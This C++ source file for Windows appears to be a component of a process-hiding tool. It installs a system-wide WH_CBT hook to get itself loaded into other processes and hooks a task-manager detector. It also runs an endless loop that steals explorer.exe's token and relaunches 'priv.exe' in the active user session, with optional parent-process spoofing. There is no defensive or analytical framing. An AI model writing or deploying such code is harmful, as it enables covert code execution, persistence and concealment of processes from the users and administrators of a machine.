#include "stdafx.h"
#include "ProcessHideHooks.h"
#include "TaskManagerDetector.h"
#include "Utils.h"

extern HMODULE hCurrentModule;
HHOOK g_hook = nullptr;

static LRESULT CALLBACK HookProc(int    nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

UINT InjectIntoUserSession(LPVOID pParam)
{
    DWORD dwError;

    while (true)
    {
        HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        DWORD processID = 0;
        DWORD processSessionID = 0;
        WCHAR* pBuffer = NULL;
        DWORD pBytesReturned = 0;
        std::wstring sUserName;

        // GetExplorer PID
        do
        {
            if (hSnapShot == INVALID_HANDLE_VALUE)
                break;

            PROCESSENTRY32W pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32W);

            if (Process32FirstW(hSnapShot, &pe32) == FALSE)
                break;

            do
            {
                pe32.szExeFile;

                ProcessIdToSessionId(pe32.th32ProcessID, &processSessionID);
                if (processSessionID == 0)
                    continue;

                if (pe32.th32ProcessID == 0)
                    continue;

                //	if( isUserInAdminGroup( pe32.th32ProcessID ) == FALSE )
                //		continue;

                if (0 != _wcsicmp(pe32.szExeFile, L"EXPLORER.EXE"))
                    continue;

                {

                    HANDLE h = ::OpenProcess(MAXIMUM_ALLOWED, TRUE, pe32.th32ProcessID);
                    if (h == NULL)
                        break;

                    HANDLE hProcessToken = NULL;
                    if (!::OpenProcessToken(h, TOKEN_READ, &hProcessToken) || !hProcessToken)
                        return false;

                    DWORD dwProcessTokenInfoAllocSize = 0;
                    ::GetTokenInformation(hProcessToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);

                    if (::GetLastError() == ERROR_INSUFFICIENT_BUFFER)
                    {
                        PTOKEN_USER pUserToken = reinterpret_cast<PTOKEN_USER>(new BYTE[dwProcessTokenInfoAllocSize]);
                        if (pUserToken != NULL)
                        {
                            if (::GetTokenInformation(hProcessToken, TokenUser, pUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize) == TRUE)
                            {
                                SID_NAME_USE snuSIDNameUse;
                                WCHAR szUser[MAX_PATH] = { 0 };
                                DWORD dwUserNameLength = MAX_PATH;
                                WCHAR szDomain[MAX_PATH] = { 0 };
                                DWORD dwDomainNameLength = MAX_PATH;

                                if (::LookupAccountSidW(NULL, pUserToken->User.Sid, szUser, &dwUserNameLength,
                                    szDomain, &dwDomainNameLength, &snuSIDNameUse))
                                {
                                    sUserName = szUser;

                                    CloseHandle(hProcessToken);
                                    delete[] pUserToken;
                                    pUserToken = NULL;
                                }
                            }

                            if (pUserToken != NULL)
                                delete[] pUserToken;
                        }
                    }
                }

                if (sUserName.compare(L"SYSTEM") == 0)
                    continue;

                processID = pe32.th32ProcessID;
                break;

            } while (Process32NextW(hSnapShot, &pe32) != FALSE);

        } while (false);

        if (hSnapShot != INVALID_HANDLE_VALUE)
            CloseHandle(hSnapShot);

        // GetActiveSession
        DWORD dwSessionId = UINT_MAX;
        {
            PWTS_SESSION_INFOW pSessionInfo = NULL;
            DWORD dwCount = 0;

            WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwCount);

            for (DWORD i = 0; i < dwCount; ++i)
            {
                WTS_SESSION_INFOW si = pSessionInfo[i];
                if (WTSActive == si.State)
                {
                    dwSessionId = si.SessionId;
                    break;
                }
            }

            WTSFreeMemory(pSessionInfo);
        }

        // CreateProcess
        BOOL isSuccess = FALSE;
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        HANDLE hTokenDup = NULL;
        LPVOID pEnv = NULL;
        LPWSTR lpszPath = NULL;
        LPWSTR* wszCommandLineItems = NULL;

        do
        {
            hProcess = ::OpenProcess(MAXIMUM_ALLOWED, TRUE, processID);
            if (hProcess == NULL)
                break;

            isSuccess = OpenProcessToken(hProcess,
                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_SESSIONID,
                &hToken);
            if (isSuccess == FALSE)
                break;

#define MAKE_ELEVATION 0

#if MAKE_ELEVATION == 0

            if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hTokenDup))
                break;

#else

            HANDLE linkedToken = GetLinkedToken(hToken);
            if (linkedToken == 0)
            {
                //linkedToken = hToken;
                break;
            }

            if (!DuplicateTokenEx(linkedToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hTokenDup))
                break;

            CloseHandle(linkedToken);

#endif

            SetTokenInformation(hTokenDup, TokenSessionId, (LPVOID)&dwSessionId, sizeof(DWORD));

#if SWITCH_PARENT > 0
            STARTUPINFOEXW sie;
            ZeroMemory(&sie, sizeof(sie));
            sie.StartupInfo.cb = sizeof(sie);
            sie.StartupInfo.lpDesktop = L"winsta0\\default";

            PROCESS_INFORMATION pi;
            ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
            DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS
                | CREATE_NEW_CONSOLE
                | EXTENDED_STARTUPINFO_PRESENT;
#else
            // CreateProcessAsUser
            STARTUPINFOW si;
            ZeroMemory(&si, sizeof(STARTUPINFOW));
            si.cb = sizeof(STARTUPINFOW);
            si.lpDesktop = (LPWSTR)L"winsta0\\default";

            PROCESS_INFORMATION pi;
            ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
            DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;
#endif

            if (CreateEnvironmentBlock(&pEnv, hTokenDup, TRUE))
                dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
            else
                pEnv = NULL;

            lpszPath = _wcsdup(L"priv.exe"); // fileFullPath
            if (lpszPath == NULL)
                break;

#if SWITCH_PARENT > 0
            DWORD ParentId = processID;

            // Add temporal thread attributes
            const DWORD dwAttributeCount = 1;
            SIZE_T cbAttributeListSize = 0;
            isSuccess = InitializeProcThreadAttributeList(
                NULL,
                dwAttributeCount,
                0, //reserved and must be zero
                &cbAttributeListSize);

            if (!isSuccess)
            {
                DTRACE(DTRACE_USER_PROCESS, "cbAttributeListSize=%d\n", (int)cbAttributeListSize);
                dwError = ::GetLastError();
                if (dwError != ERROR_INSUFFICIENT_BUFFER)
                {
                    DTRACE(DTRACE_USER_PROCESS, "InitializeProcThreadAttributeList(size) failed 0x%08X\n", dwError);
                    return dwError;
                }
            }

            std::vector<BYTE> bufferThreadAttributeList(cbAttributeListSize);
            PPROC_THREAD_ATTRIBUTE_LIST pAttributeList =
                reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(&bufferThreadAttributeList[0]);

            isSuccess = InitializeProcThreadAttributeList(
                pAttributeList,
                dwAttributeCount,
                0, //reserved and must be zero
                &cbAttributeListSize);

            if (!isSuccess)
            {
                dwError = ::GetLastError();
                DTRACE(DTRACE_USER_PROCESS, "InitializeProcThreadAttributeList(object) failed 0x%08X\n", dwError);
                return dwError;
            }

            utils::CHandleGuard hParentProcess(
                ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, ParentId)
            );

            if (NULL == hParentProcess)
            {
                dwError = ::GetLastError();
                DTRACE(DTRACE_USER_PROCESS, "OpenProcess(Parent) failed 0x%08X\n", dwError);
                return dwError;
            }

            isSuccess = UpdateProcThreadAttribute(
                pAttributeList,
                0, //reserved and must be 0
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hParentProcess,
                sizeof(HANDLE),
                NULL,  //reserved and must be NULL
                NULL   //reserved and must be NULL
            );

            if (!isSuccess)
            {
                dwError = ::GetLastError();
                DTRACE(DTRACE_USER_PROCESS, "UpdateProcThreadAttribute failed 0x%08X\n", dwError);
                return dwError;
            }

            sie.lpAttributeList = pAttributeList;
#endif

#if SWITCH_IMPERSONATION > 0
            //DWORD threadId = 0;
            //CScopedImpersonation scopedImpersonation (threadId, processID);

            ::SetLastError(0);
            isSuccess = ::ImpersonateLoggedOnUser(hTokenDup);
            DTRACE(DTRACE_USER_PROCESS, "ImpersonateLoggedOnUser return %d, error 0x%08X\n", isSuccess, ::GetLastError());
#endif

#if 0
            if (EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, TRUE) == FALSE)
            {
                DTRACE(DTRACE_USER_PROCESS, "SE_ASSIGNPRIMARYTOKEN_NAME FAILED error code : %u \n", ::GetLastError());
            }
            else
            {
                DTRACE(DTRACE_USER_PROCESS, "SE_ASSIGNPRIMARYTOKEN_NAME SUCCESS \n", ::GetLastError());
            }
#endif

            SetLastError(0);
#if SWITCH_PARENT > 0
            isSuccess = ::CreateProcessAsUserW(
                hTokenDup,
                NULL,
                lpszPath,
                NULL,
                NULL,
                FALSE,
                dwCreationFlags,
                pEnv,
                NULL,
                &sie.StartupInfo,
                &pi);
#else
            isSuccess = ::CreateProcessAsUserW(
                hTokenDup,
                NULL,
                lpszPath,
                NULL,
                NULL,
                FALSE,
                dwCreationFlags,
                pEnv,
                NULL,
                &si,
                &pi);
#endif

            if (isSuccess != FALSE)
            {
                WaitForSingleObject(pi.hProcess, INFINITE);

                if (pi.hProcess != NULL)
                    CloseHandle(pi.hProcess);
                if (pi.hThread != NULL)
                    CloseHandle(pi.hThread);
            }

#if SWITCH_PARENT > 0
            if (pAttributeList != NULL)
            {
                DeleteProcThreadAttributeList(pAttributeList);
            }
#endif

#if SWITCH_IMPERSONATION > 0
            ::SetLastError(0);
            isSuccess = ::RevertToSelf();
            DTRACE(DTRACE_USER_PROCESS, "RevertToSelf return %d, error 0x%08X\n", isSuccess, ::GetLastError());
#endif

        } while (false);

        Sleep(2000);
    }

    return 0;
}

bool InstallHooks()
{
    if (toLowerW(GetCurrentProcessName()).compare(L"tskmng.exe"))
    {
        if (!TaskManagerDetector::GetInstance()->InstallHooks())
        {
            return false;
        }
    }

    return true;
}

bool Start()
{
    g_hook = SetWindowsHookEx(WH_CBT, HookProc, hCurrentModule, 0);

    if (g_hook == 0)
    {
        return false;
    }

    UINT result = InjectIntoUserSession(nullptr);
    return true;
}



